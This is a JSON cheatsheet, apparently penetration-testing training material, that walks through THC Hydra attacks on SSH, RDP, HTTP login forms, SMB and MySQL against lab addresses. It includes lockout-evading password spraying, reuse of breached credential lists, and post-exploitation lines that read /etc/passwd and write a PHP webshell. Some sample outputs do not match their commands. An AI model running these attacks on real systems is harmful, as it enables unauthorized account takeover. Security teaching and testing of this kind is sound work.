{
  "cheatsheets": [
    {
      "id": "network-authentication-attacks",
      "name": "Network Authentication Attacks",
      "description": "Attack network service authentication using dictionary and password spraying techniques with THC Hydra",
      "educational_header": {
        "how_to_recognize": [
          "Nmap scan reveals authentication-required services: SSH (22), RDP (3389), FTP (21), HTTP POST forms",
          "Banner grabbing shows service versions (outdated services may have default credentials)",
          "Service enumeration shows no anonymous access or guest accounts disabled",
          "Web application login forms use POST requests to /login, /admin, /wp-login.php",
          "Initial credential attempts (admin:admin, root:root) manually fail"
        ],
        "when_to_look_for": [
          "After initial port scanning and service enumeration (nmap)",
          "When you've identified valid usernames but no credentials (enum4linux, LDAP queries, email harvesting)",
          "After discovering password policies via error messages or brute-force testing",
          "When account lockout policies are absent or lenient (3+ failed attempts allowed)",
          "During security assessment when you have IPs but no initial foothold"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: SSH Single User Dictionary Attack",
          "context": "You've identified a Linux target (192.168.45.100) running SSH on port 22. Through web enumeration, you discovered a username 'developer' in a directory listing (/home/developer/). You suspect the developer uses a weak password from rockyou.txt. No account lockout policy detected after 10 failed login attempts.",
          "approach": "1. Confirm SSH service is accessible with nmap -p 22. 2. Prepare rockyou.txt wordlist (14M passwords). 3. Use Hydra with single username mode (-l developer). 4. Monitor progress with verbose output (-V). 5. Limit parallel tasks to avoid detection (-t 4). 6. Wait 30 seconds between attempts to avoid triggering fail2ban (-w 30). 7. Save results to file for documentation (-o ssh-cracks.txt).",
          "commands": [
            "hydra-ssh-single-user",
            "hydra-verbose",
            "hydra-parallel-tasks",
            "hydra-wait-time",
            "hydra-output-file"
          ],
          "expected_outcome": "Hydra tests rockyou.txt against 'developer' account. If password exists in wordlist, Hydra displays: '[22][ssh] host: 192.168.45.100   login: developer   password: summer2023'. SSH login confirmed with: ssh developer@192.168.45.100. Time estimate: 14M passwords \u00f7 4 parallel tasks \u00f7 2 attempts/second = ~24 hours (run overnight). Early hit possible (rockyou sorted by frequency).",
          "why_this_works": "SSH typically uses PAM authentication (Linux). No built-in account lockout by default. Fail2ban may be absent or misconfigured. Hydra parallelizes connections (4 simultaneous SSH handshakes). Each connection: TCP handshake \u2192 SSH banner \u2192 Username \u2192 Password attempt \u2192 Success/Fail. Successful crack returns 0 exit code, failed password shows 'Authentication failed'. Dictionary attack succeeds when: 1) User chose common password (top 1000 rockyou = 30% hit rate), 2) No rate limiting enforced, 3) Service doesn't log/alert on failed attempts."
        },
        {
          "title": "Scenario 2: RDP Password Spraying Attack",
          "context": "You've enumerated a Windows domain and discovered 50 valid usernames via LDAP queries (users.txt). You know the corporate password policy: 8+ chars, 1 uppercase, 1 digit, 1 special. Common pattern observed: FirstnameYear! (e.g., Sarah2024!). RDP (port 3389) allows 5 failed attempts before 30-minute lockout. You need credentials without triggering lockouts.",
          "approach": "1. Create small targeted wordlist matching observed pattern: common names + current year + !. 2. Use password spraying mode: Test EACH password against ALL users before moving to next password. 3. Use -L (user list) and -p (single password) mode. 4. Iterate through passwords manually to avoid lockout. 5. Set -t 1 (sequential, not parallel) to be stealthy. 6. Resume session if interrupted (-R). 7. Verify hits with xfreerdp immediately.",
          "commands": [
            "hydra-rdp-spray",
            "hydra-parallel-tasks",
            "hydra-resume-session",
            "hydra-show-attempts",
            "hydra-output-file"
          ],
          "expected_outcome": "Hydra tests Password1! against all 50 users, then Password2!, etc. Lockout avoided (only 1 attempt per user per password). Expected hits: 2-5 accounts (10% hit rate realistic for pattern-matched wordlist). Output: '[3389][rdp] host: 192.168.45.100   login: sarah.jones   password: Sarah2024!'. Time estimate: 10 passwords \u00d7 50 users \u00d7 5 sec/attempt = 42 minutes. Immediate foothold via RDP. Document all credentials for password reuse testing.",
          "why_this_works": "Password spraying evades lockout by staying under attempt threshold. Corporate users follow patterns (compliance with policy). Season/year appending extremely common (Spring2024!, Summer2024!). RDP authentication via CredSSP/NLA. Single password across many users is stealthier than many passwords on one user (fewer log entries per account). Lockout policy typically: X failed attempts in Y time window. Spraying spreads attempts across time + accounts. Success rate: Targeted wordlist (100 words) > Generic wordlist (14M words) for time-constrained scenarios."
        },
        {
          "title": "Scenario 3: HTTP POST Login Form Attack",
          "context": "You've discovered a web application at http://192.168.45.100/admin/ with custom login form. Burp Suite reveals POST request to /admin/login.php with parameters: username, password, submit=Login. You've found 'admin' is a valid username (different error for valid vs invalid user). No CAPTCHA detected. Session cookies not required for login attempt. Target: Crack admin password.",
          "approach": "1. Capture POST request with Burp (right-click \u2192 Copy to file). 2. Identify failure string in response (e.g., 'Invalid password' or 'Login failed'). 3. Construct Hydra HTTP POST form syntax: '/admin/login.php:username=^USER^&password=^PASS^&submit=Login:F=Invalid password'. 4. Use rockyou.txt for password list. 5. Monitor for success (absence of failure string). 6. Use -V for verbose output to see each attempt. 7. Set -f to stop on first valid password found.",
          "commands": [
            "hydra-http-post-form",
            "hydra-verbose",
            "hydra-show-attempts",
            "hydra-output-file"
          ],
          "expected_outcome": "Hydra sends POST requests to /admin/login.php with username=admin and passwords from rockyou.txt. Monitors responses for failure string absence. Success: '[80][http-post-form] host: 192.168.45.100   login: admin   password: admin123'. Verify by logging in via browser with admin:admin123. Access admin panel, look for: File upload, command execution, database access, config files. Time: 14M passwords \u00f7 16 tasks \u00f7 10 req/sec = ~24 hours (optimize with smaller wordlist first).",
          "why_this_works": "HTTP POST forms are stateless (no session required for authentication). Hydra automates POST request construction. ^USER^ and ^PASS^ are placeholders Hydra replaces with candidates. Failure string detection: Hydra parses HTML response, looks for specified string. Success = string NOT found (indicates different response). Works because: Web apps often have weak passwords (no complexity enforcement), No rate limiting on login endpoint, CAPTCHA absent, Account lockout not implemented. Alternative: If login uses cookies/CSRF, use Burp Intruder instead."
        },
        {
          "title": "Scenario 4: SMB Authentication with Combo Attack",
          "context": "You've obtained a list of 20 username:password pairs from a previous breach (combo.txt format: john:Password1, sarah:Summer2024, etc.). Target Windows file server (192.168.45.100) allows SMB authentication (port 445). You want to test if any of these credential pairs are reused. Credentials in combo.txt format (username:password, one per line).",
          "approach": "1. Verify combo.txt format: username:password (colon-separated, no spaces). 2. Use Hydra's -C flag for combo mode (reads pairs from file). 3. Target SMB service on port 445. 4. Use -t 1 to avoid account lockout (test pairs sequentially). 5. Set -f to stop on first valid pair. 6. Save output to file for documentation. 7. Verify successful credentials immediately with smbclient or CrackMapExec.",
          "commands": [
            "hydra-combo-attack",
            "hydra-smb-attack",
            "hydra-parallel-tasks",
            "hydra-output-file",
            "hydra-verbose"
          ],
          "expected_outcome": "Hydra tests each username:password pair from combo.txt against SMB service. Success: '[445][smb] host: 192.168.45.100   login: sarah.jones   password: Summer2024!'. Immediate verification: smbclient -L \\\\192.168.45.100 -U sarah.jones (enter password, list shares). Time: 20 pairs \u00d7 3 sec/attempt = 60 seconds. Password reuse common in corporate environments. Use valid credentials for: Share enumeration, lateral movement, credential dumping, privilege escalation.",
          "why_this_works": "Password reuse is endemic. Users use same passwords across: Personal accounts, Corporate accounts, Different services in same network. Combo lists from breaches (LinkedIn, Adobe, etc.) provide real username:password pairs. SMB authentication via NTLM/Kerberos. Domain-joined machines accept domain credentials. Hydra's combo mode optimizes for known pairs (faster than cartesian product). Success indicates: 1) User reused breached password, 2) Corporate password policy allows weak passwords, 3) No credential rotation enforced. Defense: Password manager, MFA, regular password changes."
        },
        {
          "title": "Scenario 5: MySQL Database Brute-Force",
          "context": "Nmap scan reveals MySQL database on 192.168.45.100:3306. Banner shows MySQL 5.7 (no known authentication bypass). Default 'root' account confirmed (different error for valid vs invalid user). You suspect weak root password. No network firewall restricting your IP. Goal: Gain root database access for credential extraction.",
          "approach": "1. Confirm MySQL service with: nmap -p 3306 --script mysql-info. 2. Create small custom wordlist: MySQL defaults (root, toor, mysql, password) + rockyou top 1000. 3. Use Hydra with -l root (single user mode). 4. Set -t 4 for parallel connections. 5. Monitor with -V for progress. 6. Use -w 5 to avoid triggering connection limits. 7. On success, verify with: mysql -h 192.168.45.100 -u root -p.",
          "commands": [
            "hydra-mysql-attack",
            "hydra-verbose",
            "hydra-parallel-tasks",
            "hydra-wait-time",
            "hydra-output-file"
          ],
          "expected_outcome": "Hydra tests passwords against MySQL root account. Success: '[3306][mysql] host: 192.168.45.100   login: root   password: root'. Verification: mysql -h 192.168.45.100 -u root -p (enter 'root', gain shell). Enumerate databases: SHOW DATABASES; Look for: wordpress (wp_users table), application DBs (credentials), mysql.user (password hashes). Time: 1000 passwords \u00f7 4 tasks \u00f7 2 attempts/sec = ~2 minutes. Extract hashes for offline cracking or pivot via stored procedures (UDF exploitation).",
          "why_this_works": "MySQL default installation often has weak root password (root, mysql, or blank). DBAs prioritize availability over security. Remote root login enabled by default in older versions. Hydra uses MySQL protocol (TCP 3306). Authentication: Client connects \u2192 Server sends challenge \u2192 Client sends hashed password \u2192 Server verifies. Failed attempt = 'Access denied'. Success = Connection established. No account lockout in MySQL (application-level, not DB-level). Success enables: SELECT * FROM mysql.user (dump all DB users), Reading files: SELECT LOAD_FILE('/etc/passwd'), Writing files (if FILE privilege): SELECT 'shell' INTO OUTFILE '/var/www/shell.php'."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: Pre-Attack Reconnaissance",
          "notes": "Before launching password attacks, gather intelligence to optimize success rate and minimize detection. Identify: Valid usernames, Password policy (length, complexity, lockout), Service versions (default credentials), Attack surface (open ports, authentication methods).",
          "commands": [
            {
              "id": "hydra-show-attempts",
              "example": "hydra -l admin -P /usr/share/wordlists/rockyou.txt -v ssh://192.168.45.100",
              "shows": "Shows discovered services/users/shares"
            },
            {
              "id": "hydra-verbose",
              "example": "hydra -l admin -P /usr/share/wordlists/rockyou.txt -V ssh://192.168.45.100",
              "shows": "[ATTEMPT] target <TARGET> - login <USER> - pass <PASS>"
            }
          ]
        },
        {
          "title": "Phase 2: Wordlist Preparation",
          "notes": "Select wordlist based on scenario: Generic attack = rockyou.txt (14M passwords), Targeted attack = Custom wordlist (company patterns, seasons, years), Combo attack = Breached credential pairs. Optimize: Filter by policy (minimum length, complexity), Sort by frequency (most common first), Add mutations (rules for variations).",
          "commands": [
            {
              "id": "hydra-ssh-single-user",
              "example": "hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.45.100",
              "shows": "[22][ssh] host: <TARGET>   login: <USERNAME>   password: ..."
            },
            {
              "id": "hydra-rdp-spray",
              "example": "hydra -L /usr/share/wordlists/dirb/others/names.txt -p \"SuperS3cure1337#\" rdp://192.168.45.100",
              "shows": "[3389][rdp] host: <TARGET>   login: <USER>   password: <P..."
            },
            {
              "id": "hydra-combo-attack",
              "example": "hydra -C creds.txt ssh://192.168.45.100",
              "shows": "valid password found"
            }
          ]
        },
        {
          "title": "Phase 3: Attack Execution",
          "notes": "Launch Hydra attack with appropriate flags: -l (single user) or -L (user list), -p (single password) or -P (password list), -C (combo mode), -t (parallel tasks: 4 for SSH, 1 for spraying), -w (wait time to evade detection), -V (verbose for monitoring), -o (output file for documentation). Monitor progress and adjust if needed.",
          "commands": [
            {
              "id": "hydra-ssh-single-user",
              "example": "hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.45.100",
              "shows": "[22][ssh] host: <TARGET>   login: <USERNAME>   password: ..."
            },
            {
              "id": "hydra-rdp-spray",
              "example": "hydra -L /usr/share/wordlists/dirb/others/names.txt -p \"SuperS3cure1337#\" rdp://192.168.45.100",
              "shows": "[3389][rdp] host: <TARGET>   login: <USER>   password: <P..."
            },
            {
              "id": "hydra-http-post-form",
              "example": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.45.100 http-post-form \"/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid\"",
              "shows": "[80][http-post-form] host: <TARGET>   login: <USER>   pas..."
            },
            {
              "id": "hydra-smb-attack",
              "example": "hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.45.100",
              "shows": "[445][smb] host: <TARGET>   login: <USER>   password: <PASS>"
            },
            {
              "id": "hydra-mysql-attack",
              "example": "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.45.100",
              "shows": "[3306][mysql] host: <TARGET>   login: <USER>   password: ..."
            },
            {
              "id": "hydra-ftp-attack",
              "example": "hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://192.168.45.100",
              "shows": "[21][ftp] host: <TARGET>   login: <USER>   password: <PASS>"
            },
            {
              "id": "hydra-combo-attack",
              "example": "hydra -C creds.txt ssh://192.168.45.100",
              "shows": "valid password found"
            }
          ]
        },
        {
          "title": "Phase 4: Session Management",
          "notes": "For long-running attacks (>1 hour), use session management: --session=<NAME> to enable pause/resume, Ctrl+C to pause gracefully, -R to restore session. Monitor progress: Check output file periodically, Use -V to see real-time attempts, Estimate time remaining: (Total passwords \u00f7 Parallel tasks) \u00f7 Attempts per second.",
          "commands": [
            {
              "id": "hydra-resume-session",
              "example": "hydra -l admin -P /usr/share/wordlists/rockyou.txt -R ssh://192.168.45.100",
              "shows": "Restoring session from file"
            },
            {
              "id": "hydra-show-attempts",
              "example": "hydra -l admin -P /usr/share/wordlists/rockyou.txt -v ssh://192.168.45.100",
              "shows": "Shows discovered services/users/shares"
            },
            {
              "id": "hydra-output-file",
              "example": "hydra -l admin -P /usr/share/wordlists/rockyou.txt -o hydra_results.txt ssh://192.168.45.100",
              "shows": "Shows discovered services/users/shares"
            }
          ]
        },
        {
          "title": "Phase 5: Post-Exploitation Verification",
          "notes": "Immediately verify cracked credentials: SSH: ssh user@target, RDP: xfreerdp /u:user /p:pass /v:target, HTTP: Login via browser, SMB: smbclient -L \\\\target -U user, MySQL: mysql -h target -u user -p. Document: Username, Password, Service, Timestamp, Access level. Test for: Password reuse on other services, Privilege escalation opportunities, Lateral movement paths.",
          "commands": [
            {
              "id": "hydra-show-attempts",
              "example": "hydra -l admin -P /usr/share/wordlists/rockyou.txt -v ssh://192.168.45.100",
              "shows": "Shows discovered services/users/shares"
            },
            {
              "id": "hydra-output-file",
              "example": "hydra -l admin -P /usr/share/wordlists/rockyou.txt -o hydra_results.txt ssh://192.168.45.100",
              "shows": "Shows discovered services/users/shares"
            }
          ]
        }
      ],
      "tags": [
        "PASSWORD_ATTACKS",
        "NETWORK_AUTH",
        "HYDRA",
        "DICTIONARY_ATTACK",
        "PASSWORD_SPRAY"
      ]
    }
  ]
}